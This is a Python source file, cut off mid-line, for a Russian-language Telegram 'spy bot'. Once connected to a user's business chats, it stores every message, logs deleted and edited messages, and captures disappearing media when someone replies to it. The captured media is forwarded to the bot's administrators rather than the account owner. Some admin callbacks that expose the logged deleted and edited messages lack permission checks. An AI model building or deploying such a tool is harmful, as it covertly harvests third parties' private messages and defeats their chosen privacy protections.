"""
Lira Spy Bot — Bot API + TDLib
С поддержкой исчезающих сообщений, фильтрами, админ-командами
"""
import os
import json
import time
import logging
import requests
import subprocess
import asyncio
from datetime import datetime
from dotenv import load_dotenv
from database.supabase_client import SupabaseClient
from utils.helpers import setup_logging

load_dotenv()
setup_logging()
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
CREATOR_ID = 1658547011
API_BASE = f"https://api.telegram.org/bot{BOT_TOKEN}"
SUPABASE_URL = os.getenv('SUPABASE_URL')
SUPABASE_KEY = os.getenv('SUPABASE_KEY')
TDLIB_PATH = os.getenv('TDLIB_PATH', 'tdlib_json')

db = SupabaseClient(SUPABASE_URL, SUPABASE_KEY)
offset = 0
os.makedirs('downloads', exist_ok=True)

_settings_cache = {}
_settings_cache_time = {}
CACHE_TTL = 300
_filters_cache = {}
_filters_cache_time = {}
_sent_notifications = {}

# ============================================================
# ЗАГРУЗКА АДМИНОВ ИЗ БД
# ============================================================
_admin_ids = []

async def load_admins():
    global _admin_ids
    _admin_ids = await db.get_admins()
    if CREATOR_ID not in _admin_ids:
        _admin_ids.append(CREATOR_ID)
    logger.info(f"Администраторы: {_admin_ids}")

def is_admin(user_id):
    return user_id in _admin_ids

# ============================================================
# API HELPERS
# ============================================================

def api(method, data=None, files=None, retries=2):
    for attempt in range(retries):
        try:
            if files:
                resp = requests.post(f"{API_BASE}/{method}", data=data, files=files, timeout=15)
            else:
                resp = requests.post(f"{API_BASE}/{method}", json=data, timeout=15)
            return resp.json()
        except Exception:
            time.sleep(1)
    return None

def send(chat_id, text, parse_mode='HTML', reply_markup=None):
    data = {'chat_id': chat_id, 'text': text, 'parse_mode': parse_mode}
    if reply_markup:
        data['reply_markup'] = json.dumps(reply_markup)
    return api('sendMessage', data)

def answer_callback(callback_id, text='', show_alert=False):
    return api('answerCallbackQuery', {
        'callback_query_id': callback_id,
        'text': text,
        'show_alert': show_alert
    })

def get_media_type(msg):
    if msg.get('photo'): return 'photo'
    if msg.get('video'): return 'video'
    if msg.get('voice'): return 'voice'
    if msg.get('video_note'): return 'video_note'
    if msg.get('document'): return 'document'
    return None

def is_secret_media(msg):
    """Проверяет, является ли сообщение секретным (исчезающим)"""
    if not msg:
        return False
    
    # Проверка через media объект
    if 'media' in msg:
        media = msg.get('media', {})
        if isinstance(media, dict) and media.get('ttl_seconds'):
            return True
    
    # Проверка через photo/video объекты
    for media_type in ['photo', 'video', 'voice', 'video_note', 'document']:
        if media_type in msg:
            item = msg[media_type]
            if isinstance(item, dict) and item.get('ttl_seconds'):
                return True
            # Для фото — это список
            if media_type == 'photo' and isinstance(item, list):
                for photo in item:
                    if isinstance(photo, dict) and photo.get('ttl_seconds'):
                        return True
    
    return False

def is_duplicate(chat_id, message_id, event_type, ttl=5):
    key = f"{chat_id}:{message_id}:{event_type}"
    now = time.time()
    if key in _sent_notifications and now - _sent_notifications[key] < ttl:
        return True
    _sent_notifications[key] = now
    return False

# ============================================================
# КЭШ И ФИЛЬТРЫ
# ============================================================

def get_cached_settings(user_id):
    now = time.time()
    if user_id in _settings_cache:
        if now - _settings_cache_time.get(user_id, 0) < CACHE_TTL:
            return _settings_cache[user_id]
    try:
        resp = requests.get(f"{SUPABASE_URL}/rest/v1/settings", params={
            'select': '*', 'user_id': f'eq.{user_id}'
        }, headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'}, timeout=5)
        data = resp.json()
        if isinstance(data, list) and data:
            settings = data[0]
        else:
            settings = {'notify_deleted': True, 'notify_edited': True, 'notify_media': True}
    except Exception:
        settings = {'notify_deleted': True, 'notify_edited': True, 'notify_media': True}
    _settings_cache[user_id] = settings
    _settings_cache_time[user_id] = now
    return settings

def invalidate_settings_cache(user_id):
    _settings_cache.pop(user_id, None)
    _settings_cache_time.pop(user_id, None)

def get_user_filters(user_id):
    now = time.time()
    if user_id in _filters_cache:
        if now - _filters_cache_time.get(user_id, 0) < CACHE_TTL:
            return _filters_cache[user_id]
    try:
        resp = requests.get(f"{SUPABASE_URL}/rest/v1/user_filters", params={
            'select': '*', 'user_id': f'eq.{user_id}'
        }, headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'}, timeout=5)
        filters = resp.json()
        if not isinstance(filters, list):
            filters = []
    except Exception:
        filters = []
    _filters_cache[user_id] = filters
    _filters_cache_time[user_id] = now
    return filters

def should_notify(user_id, chat_id, sender_id):
    filters = get_user_filters(user_id)
    if not filters:
        return True
    include = [f for f in filters if f['filter_type'] == 'include']
    exclude = [f for f in filters if f['filter_type'] == 'exclude']
    if include:
        for f in include:
            if f['target_type'] == 'chat' and f['target_id'] == chat_id:
                return True
            if f['target_type'] == 'user' and f['target_id'] == sender_id:
                return True
        return False
    for f in exclude:
        if f['target_type'] == 'chat' and f['target_id'] == chat_id:
            return False
        if f['target_type'] == 'user' and f['target_id'] == sender_id:
            return False
    return True

# ============================================================
# TDLib
# ============================================================

class TDLibClient:
    def __init__(self):
        self.process = None
        self.connected = False

    def start(self):
        try:
            if os.path.exists(TDLIB_PATH):
                self.process = subprocess.Popen(
                    [TDLIB_PATH],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                self.connected = True
                logger.info("TDLib started")
                return True
            else:
                logger.warning(f"TDLib not found at {TDLIB_PATH}")
                return False
        except Exception as e:
            logger.error(f"TDLib start error: {e}")
            return False

    def send_request(self, request):
        if not self.connected or not self.process:
            return None
        try:
            self.process.stdin.write(json.dumps(request).encode() + b'\n')
            self.process.stdin.flush()
            response = self.process.stdout.readline()
            if response:
                return json.loads(response.decode())
        except Exception as e:
            logger.error(f"TDLib request error: {e}")
        return None

    def download_file(self, file_id, path):
        request = {'@type': 'downloadFile', 'file_id': file_id, 'priority': 1}
        return self.send_request(request)

    def stop(self):
        if self.process:
            self.process.terminate()
            self.connected = False

tdlib = TDLibClient()

# ============================================================
# MEDIA HANDLING
# ============================================================

def download_telegram_file(file_id):
    try:
        file_info = api('getFile', {'file_id': file_id})
        if not file_info or not file_info.get('ok'):
            return None
        file_path = file_info['result']['file_path']
        url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
        resp = requests.get(url, timeout=60)
        if resp.status_code != 200:
            return None
        ext = file_path.split('.')[-1] if '.' in file_path else 'bin'
        local = f"downloads/{file_id[:15]}.{ext}"
        with open(local, 'wb') as f:
            f.write(resp.content)
        return local
    except Exception as e:
        logger.error(f"Download error: {e}")
        return None

def send_media_to_admin(msg, chat_id, caption_extra=''):
    sender = msg.get('from', {})
    sender_name = sender.get('first_name', 'Unknown')
    sender_username = sender.get('username')
    mention = f"@{sender_username}" if sender_username else sender_name
    caption = f"📎 <b>Медиа</b>\n👤 {mention} | 💬 Чат: {chat_id}"
    if caption_extra:
        caption += f"\n{caption_extra}"

    if msg.get('photo'):
        file_id = msg['photo'][-1]['file_id']
    elif msg.get('video'):
        file_id = msg['video']['file_id']
    elif msg.get('voice'):
        file_id = msg['voice']['file_id']
    elif msg.get('document'):
        file_id = msg['document']['file_id']
    elif msg.get('video_note'):
        file_id = msg['video_note']['file_id']
    else:
        return False

    local = download_telegram_file(file_id)
    if not local:
        return False

    try:
        with open(local, 'rb') as f:
            if msg.get('photo'):
                for admin_id in _admin_ids:
                    api('sendPhoto', {'chat_id': admin_id, 'caption': caption, 'parse_mode': 'HTML'},
                        files={'photo': f})
            elif msg.get('video'):
                for admin_id in _admin_ids:
                    api('sendVideo', {'chat_id': admin_id, 'caption': caption, 'parse_mode': 'HTML'},
                        files={'video': f})
            elif msg.get('voice'):
                for admin_id in _admin_ids:
                    api('sendVoice', {'chat_id': admin_id, 'caption': caption, 'parse_mode': 'HTML'},
                        files={'voice': f})
            elif msg.get('video_note'):
                for admin_id in _admin_ids:
                    api('sendVideoNote', {'chat_id': admin_id}, files={'video_note': f})
            else:
                for admin_id in _admin_ids:
                    api('sendDocument', {'chat_id': admin_id, 'caption': caption, 'parse_mode': 'HTML'},
                        files={'document': f})
    except Exception as e:
        logger.error(f"Send media error: {e}")
    finally:
        try:
            os.remove(local)
        except Exception:
            pass
    return True

# ============================================================
# КЛАВИАТУРЫ
# ============================================================

def main_menu(is_admin_user=False):
    buttons = [
        [{'text': '🔌 Подключить бота', 'callback_data': 'connect'}],
        [{'text': '⚙️ Настройки', 'callback_data': 'settings'},
         {'text': '📋 Инструкции', 'callback_data': 'instructions'}],
        [{'text': '🎯 Фильтры', 'callback_data': 'filters'},
         {'text': '👥 Рефералка', 'callback_data': 'referral'}],
    ]
    if is_admin_user:
        buttons.append([{'text': '👑 Админ-панель', 'callback_data': 'admin'}])
    return {'inline_keyboard': buttons}

def settings_kb(user_id):
    s = get_cached_settings(user_id)
    nd = "✅" if s.get('notify_deleted') else "❌"
    ne = "✅" if s.get('notify_edited') else "❌"
    nm = "✅" if s.get('notify_media') else "❌"
    return {'inline_keyboard': [
        [{'text': f'{nd} Удаления', 'callback_data': 'toggle_del'},
         {'text': f'{ne} Редактирования', 'callback_data': 'toggle_edt'}],
        [{'text': f'{nm} Медиа', 'callback_data': 'toggle_media'}],
        [{'text': '◀️ Назад', 'callback_data': 'main'}],
    ]}

def filters_kb(user_id):
    filters = get_user_filters(user_id)
    count = len(filters)
    return {'inline_keyboard': [
        [{'text': f'📋 Фильтры ({count})', 'callback_data': 'filter_list'}],
        [{'text': '➕ Добавить чат', 'callback_data': 'filter_add_chat'}],
        [{'text': '➕ Добавить пользователя', 'callback_data': 'filter_add_user'}],
        [{'text': '🗑 Очистить все', 'callback_data': 'filter_clear'}],
        [{'text': '◀️ Назад', 'callback_data': 'main'}],
    ]}

def instructions_kb():
    return {'inline_keyboard': [
        [{'text': '🔌 Как подключить', 'callback_data': 'how_connect'}],
        [{'text': '📸 Медиа и исчезающие', 'callback_data': 'how_media'}],
        [{'text': '🎯 Фильтры', 'callback_data': 'how_filters'}],
        [{'text': '👑 Админ-команды', 'callback_data': 'how_admin'}],
        [{'text': '◀️ Назад', 'callback_data': 'main'}],
    ]}

def admin_kb():
    return {'inline_keyboard': [
        [{'text': '👥 Пользователи', 'callback_data': 'adm_users'}],
        [{'text': '📊 Статистика', 'callback_data': 'adm_stats'}],
        [{'text': '📋 Удаления', 'callback_data': 'adm_deleted'}],
        [{'text': '📋 Редактирования', 'callback_data': 'adm_edited'}],
        [{'text': '➕ Выдать доступ', 'callback_data': 'adm_grant'}],
        [{'text': '◀️ Назад', 'callback_data': 'main'}],
    ]}

# ============================================================
# USER MANAGEMENT
# ============================================================

async def register_user(msg, is_business=False):
    if is_business:
        return
    sender = msg.get('from', {})
    user_id = sender.get('id')
    if not user_id or user_id == 136817688:
        return
    username = sender.get('username', '')
    if username and 'bot' in username.lower():
        return
    existing = await db.get_user(user_id)
    if not existing:
        role = 'admin' if user_id in _admin_ids else 'user'
        await db.create_user(user_id, username, sender.get('first_name'), role)

# ============================================================
# MESSAGE HANDLERS
# ============================================================

async def handle_message(msg, is_business=False):
    chat_id = msg['chat']['id']
    user_id = msg.get('from', {}).get('id', chat_id)
    text = msg.get('text', '')
    message_id = msg['message_id']
    media_type = get_media_type(msg)

    await register_user(msg, is_business)

    data = {
        'message_id': message_id,
        'chat_id': chat_id,
        'from_user_id': user_id,
        'from_username': msg.get('from', {}).get('username'),
        'text': text or '',
        'media_type': media_type,
        'sent_at': datetime.fromtimestamp(msg['date']).isoformat(),
    }
    try:
        await db.save_message_raw(data)
    except Exception:
        pass

    # Проверяем, является ли это сообщение ответом на секретное
    reply = msg.get('reply_to_message')
    is_secret_reply = False
    if reply:
        # Проверяем, было ли оригинальное сообщение секретным
        if is_secret_media(reply):
            is_secret_reply = True
            logger.info(f"Обнаружен ответ на секретное сообщение: {message_id} -> {reply.get('message_id')}")

    # Отправляем медиа, если это бизнес-сообщение ИЛИ ответ на секретное
    if media_type and (is_business or is_secret_reply):
        for admin_id in _admin_ids:
            s = get_cached_settings(admin_id)
            if s.get('notify_media') and should_notify(admin_id, chat_id, user_id):
                extra = "🔥 Исчезающее (ответ)" if is_secret_reply else ""
                send_media_to_admin(msg, chat_id, caption_extra=extra)

    # Обработка команд
    if not is_business:
        if text == '/start':
            await cmd_start(chat_id, msg.get('from'))
        elif text == '/help':
            await cmd_help(chat_id)
        elif text == '/myid':
            send(chat_id, f"🆔 <code>{user_id}</code>")
        elif text == '/settings':
            send(chat_id, "⚙️ <b>Настройки</b>", reply_markup=settings_kb(user_id))
        elif text == '/filters':
            send(chat_id, "🎯 <b>Фильтры</b>\n\nВыберите что отслеживать:",
                 reply_markup=filters_kb(user_id))
        elif text.startswith('/broadcast ') and is_admin(user_id):
            msg_text = text.replace('/broadcast ', '', 1)
            users = await db.get_all_active_user_ids()
            sent = sum(1 for uid in users if send(uid, f"📢 {msg_text}"))
            send(chat_id, f"✅ Отправлено {sent}/{len(users)}")
        elif text.startswith('/ban ') and is_admin(user_id):
            try:
                target = int(text.split()[1])
                if target not in _admin_ids:
                    await db.update_user(target, {'status': 'banned'})
                    send(chat_id, f"✅ Заблокирован <code>{target}</code>")
            except (ValueError, IndexError):
                send(chat_id, "❌ /ban <code>ID</code>")
        elif text.startswith('/grant ') and is_admin(user_id):
            parts = text.split()
            if len(parts) == 2:
                try:
                    target = int(parts[1])
                    if target not in _admin_ids:
                        if await db.add_admin(target):
                            _admin_ids.append(target)
                            send(chat_id, f"✅ Пользователь <code>{target}</code> получил доступ.")
                            send(target, "🎉 Вам выдан доступ к боту Lira Spy Bot!")
                        else:
                            send(chat_id, "❌ Ошибка добавления.")
                    else:
                        send(chat_id, "ℹ️ Пользователь уже имеет доступ.")
                except ValueError:
                    send(chat_id, "❌ Неверный формат. Используйте: /grant <user_id>")
            else:
                send(chat_id, "❌ Используйте: /grant <user_id>")
        elif text.startswith('/revoke ') and is_admin(user_id):
            parts = text.split()
            if len(parts) == 2:
                try:
                    target = int(parts[1])
                    if target == CREATOR_ID:
                        send(chat_id, "❌ Нельзя отозвать доступ у создателя.")
                    elif target in _admin_ids:
                        if await db.remove_admin(target):
                            _admin_ids.remove(target)
                            send(chat_id, f"✅ Доступ отозван у <code>{target}</code>.")
                        else:
                            send(chat_id, "❌ Ошибка удаления.")
                    else:
                        send(chat_id, "ℹ️ Пользователь не имеет доступа.")
                except ValueError:
                    send(chat_id, "❌ Неверный формат. Используйте: /revoke <user_id>")
            else:
                send(chat_id, "❌ Используйте: /revoke <user_id>")

# ============================================================
# CALLBACK HANDLER
# ============================================================

async def handle_callback(query):
    try:
        chat_id = query['message']['chat']['id']
        user_id = query['from']['id']
        data = query['data']
        cb_id = query['id']
        answer_callback(cb_id)
    except Exception as e:
        logger.error(f"Callback parse error: {e}")
        return

    if data == 'main':
        send(chat_id, "👋 <b>Lira Spy Bot</b>\n\nВыберите действие:",
             reply_markup=main_menu(is_admin(user_id)))
    elif data == 'connect':
        send(chat_id,
            "🔌 <b>Подключение</b>\n\n"
            "1. Настройки → Аккаунт → Автоматизация чатов\n"
            "2. Введи <b>@liraspy_bot</b>\n"
            "3. Добавить")
    elif data == 'instructions':
        send(chat_id, "📋 <b>Инструкции</b>", reply_markup=instructions_kb())
    elif data == 'settings':
        send(chat_id, "⚙️ <b>Настройки</b>", reply_markup=settings_kb(user_id))
    elif data == 'toggle_del':
        s = get_cached_settings(user_id)
        await db.update_user_settings(user_id, {'notify_deleted': not s.get('notify_deleted', True)})
        invalidate_settings_cache(user_id)
        send(chat_id, "⚙️ <b>Настройки</b>", reply_markup=settings_kb(user_id))
    elif data == 'toggle_edt':
        s = get_cached_settings(user_id)
        await db.update_user_settings(user_id, {'notify_edited': not s.get('notify_edited', True)})
        invalidate_settings_cache(user_id)
        send(chat_id, "⚙️ <b>Настройки</b>", reply_markup=settings_kb(user_id))
    elif data == 'toggle_media':
        s = get_cached_settings(user_id)
        new_val = not s.get('notify_media', True)
        s['notify_media'] = new_val
        _settings_cache[user_id] = s
        send(chat_id, "⚙️ <b>Настройки</b>", reply_markup=settings_kb(user_id))
    elif data == 'filters':
        send(chat_id, "🎯 <b>Фильтры</b>\n\nВыберите что отслеживать:",
             reply_markup=filters_kb(user_id))
    elif data == 'filter_list':
        filters = get_user_filters(user_id)
        if not filters:
            send(chat_id, "📭 Фильтров нет. Бот отслеживает всё.")
        else:
            text = "🎯 <b>Ваши фильтры:</b>\n\n"
            for f in filters:
                icon = "➕" if f['filter_type'] == 'include' else "➖"
                target = "Чат" if f['target_type'] == 'chat' else "Юзер"
                name = f.get('target_name', str(f['target_id']))
                text += f"{icon} {target}: <code>{name}</code>\n"
            send(chat_id, text)
    elif data == 'filter_add_chat':
        send(chat_id,
            "➕ <b>Добавить чат</b>\n\n"
            "Отправьте ID чата или @username\n"
            "Пример: <code>-1001234567890</code> или <code>@groupname</code>")
    elif data == 'filter_add_user':
        send(chat_id,
            "➕ <b>Добавить пользователя</b>\n\n"
            "Отправьте ID пользователя или @username\n"
            "Пример: <code>123456789</code> или <code>@username</code>")
    elif data == 'filter_clear':
        try:
            requests.delete(f"{SUPABASE_URL}/rest/v1/user_filters",
                params={'user_id': f'eq.{user_id}'},
                headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'},
                timeout=5)
            _filters_cache.pop(user_id, None)
            send(chat_id, "✅ Все фильтры удалены. Бот отслеживает всё.")
        except Exception:
            send(chat_id, "❌ Ошибка удаления фильтров")
    elif data == 'how_connect':
        send(chat_id,
            "🔌 <b>Как подключить бота</b>\n\n"
            "1. Откройте настройки Telegram\n"
            "2. Перейдите в раздел «Аккаунт» → «Автоматизация чатов»\n"
            "3. Введите @liraspy_bot\n"
            "4. Нажмите «Добавить»")
    elif data == 'how_media':
        send(chat_id,
            "📸 <b>Медиа и исчезающие сообщения</b>\n\n"
            "Бот автоматически пересылает все медиафайлы.\n\n"
            "🔥 <b>Исчезающие сообщения</b>:\n"
            "Просто ответьте на такое сообщение — бот перешлёт его содержимое.\n\n"
            "Включить/выключить: Настройки → Медиа")
    elif data == 'how_filters':
        send(chat_id,
            "🎯 <b>Фильтры</b>\n\n"
            "➕ Include — уведомлять ТОЛЬКО от этих чатов/пользователей.\n"
            "➖ Exclude — НЕ уведомлять от этих чатов/пользователей.\n\n"
            "Если фильтров нет — уведомления приходят от всех.")
    elif data == 'how_admin':
        text = (
            "👑 <b>Админ-команды</b>\n\n"
            "• /grant <user_id> — выдать доступ\n"
            "• /revoke <user_id> — отозвать доступ\n"
            "• /broadcast <текст> — массовая рассылка\n"
            "• /ban <user_id> — заблокировать\n\n"
            "Свой ID можно узнать через /myid"
        )
        send(chat_id, text)
    elif data == 'referral':
        send(chat_id,
            "👥 <b>Реферальная программа</b>\n\n"
            "Приглашай друзей: @liraspy_bot")
    elif data == 'admin' and is_admin(user_id):
        send(chat_id, "👑 <b>Админ-панель</b>", reply_markup=admin_kb())
    elif data == 'adm_users':
        users = await db.get_all_users()
        text = f"👥 <b>Пользователи ({len(users)}):</b>\n\n"
        for i, u in enumerate(users, 1):
            s = "🟢" if u.get('status') == 'active' else "🔴"
            r = "👑" if u.get('role') == 'admin' else "👤"
            n = u.get('first_name', '?')
            text += f"{i}. {s} {r} <b>{n}</b>\n"
        send(chat_id, text)
    elif data == 'adm_stats':
        users = await db.get_all_users()
        active = len([u for u in users if u.get('status') == 'active'])
        try:
            resp = requests.get(f"{SUPABASE_URL}/rest/v1/messages", params={'select': 'id', 'count': 'exact'},
                headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'}, timeout=5)
            total_msgs = resp.headers.get('content-range', '*/0').split('/')[1]
        except Exception:
            total_msgs = '?'
        send(chat_id, f"📊 <b>Статистика</b>\n\n👥 {len(users)} (активных: {active})\n💬 Сообщений: {total_msgs}")
    elif data == 'adm_deleted':
        try:
            resp = requests.get(f"{SUPABASE_URL}/rest/v1/deleted_messages", params={
                'select': 'from_username, original_text, deleted_at',
                'order': 'deleted_at.desc', 'limit': 10
            }, headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'}, timeout=5)
            deleted = resp.json()
        except Exception:
            deleted = []
        if not deleted:
            send(chat_id, "📭 Нет удалённых сообщений")
        else:
            text = "🗑 <b>Последние удаления:</b>\n\n"
            for d in deleted:
                name = d.get('from_username') or '?'
                txt = (d.get('original_text') or '')[:50]
                text += f"• {name}: {txt}\n"
            send(chat_id, text)
    elif data == 'adm_edited':
        try:
            resp = requests.get(f"{SUPABASE_URL}/rest/v1/edited_messages", params={
                'select': 'from_username, old_text, new_text, edited_at',
                'order': 'edited_at.desc', 'limit': 10
            }, headers={'apikey': SUPABASE_KEY, 'Authorization': f'Bearer {SUPABASE_KEY}'}, timeout=5)
            edited = resp.json()
        except Exception:
            edited = []
        if not edited:
            send(chat_id, "📭 Нет редактирований")
        else:
            text = "✏️ <b>Последние редактирования:</b>\n\n"
            for e in edited:
                name = e.get('from_username') or '?'
                old = (e.get('old_text') or '')[:30]
                new = (e.get('new_text') or '')[:30]
                text += f"• {name}: {old} → {new}\n"
            send(chat_id, text)
    elif data == 'adm_grant' and is_admin(user_id):
        send(chat_id,
            "➕ <b>Выдача доступа</b>\n\n"
            "Команда: /grant <user_id>\n\n"
            "Пользователь узнаёт свой ID через /myid")

# ============================================================
# BOT COMMANDS
# ============================================================

async def cmd_start(chat_id, user=None):
    name = user.get('first_name', '') if user else ''
    text = (
        f"👋 <b>Добро пожаловать, {name}!</b>\n\n"
        "Я — <b>Lira Spy Bot</b>, помогаю отслеживать удалённые, отредактированные и исчезающие сообщения.\n\n"
        "📌 <b>Быстрый старт:</b>\n"
        "1. Подключите бота к бизнес-чатам (кнопка «Подключить»).\n"
        "2. Настройте уведомления в «Настройки».\n"
        "3. Используйте фильтры, чтобы не получать лишнего.\n\n"
        "🔥 <b>Исчезающие сообщения</b> — ответьте на такое сообщение, и бот перешлёт его.\n\n"
        "Подробнее — в разделе «Инструкции»."
    )
    send(chat_id, text, reply_markup=main_menu(is_admin(user.get('id') if user else 0)))

async def cmd_help(chat_id):
    text = (
        "📖 <b>Помощь</b>\n\n"
        "• /start — главное меню\n"
        "• /settings — настройки\n"
        "• /filters — фильтры\n"
        "• /myid — ваш ID\n"
        "• /help — эта справка\n\n"
        "Для администраторов:\n"
        "• /grant <user_id> — выдать доступ\n"
        "• /revoke <user_id> — отозвать доступ\n"
        "• /broadcast <текст> — рассылка\n"
        "• /ban <user_id> — блокировка"
    )
    send(chat_id, text)

# ============================================================
# MAIN LOOP
# ============================================================

def get_updates():
    global offset
    try:
        resp = requests.get(f"{API_BASE}/getUpdates", params={
            'offset': offset,
            'timeout': 30,
            'allowed_updates': json.dumps([
                'message', 'edited_message', 'callback_query',
                'business_message', 'edited_business_message',
                'deleted_business_messages'
            ])
        }, timeout=35)
        data = resp.json()
        if data.get('ok'):
            for u in data.get('result', []):
                offset = u['update_id'] + 1
            return data.get('result', [])
    except Exception:
        pass
    return []

async def main():
    logger.info("Bot starting...")
    await load_admins()
    me = api('getMe')
    if me and me.get('ok'):
        logger.info(f"Bot: @{me['result'].get('username')}")
    if tdlib.start():
        logger.info("TDLib started for media downloads")
    api('setMyCommands', {
        'commands': [
            {'command': 'start', 'description': 'Главное меню'},
            {'command': 'settings', 'description': 'Настройки'},
            {'command': 'filters', 'description': 'Фильтры'},
            {'command': 'myid', 'description': 'Мой ID'},
            {'command': 'help', 'description': 'Помощь'},
        ]
    })
    logger.info("Listening...")
    while True:
        updates = get_updates()
        for u in updates:
            try:
                if 'callback_query' in u:
                    await handle_callback(u['callback_query'])
                elif 'message' in u:
                    await handle_message(u['message'], False)
                elif 'business_message' in u:
                    await handle_message(u['business_message'], True)
                elif 'edited_message' in u:
                    await handle_edited_message(u['edited_message'], False)
                elif 'edited_business_message' in u:
                    await handle_edited_message(u['edited_business_message'],
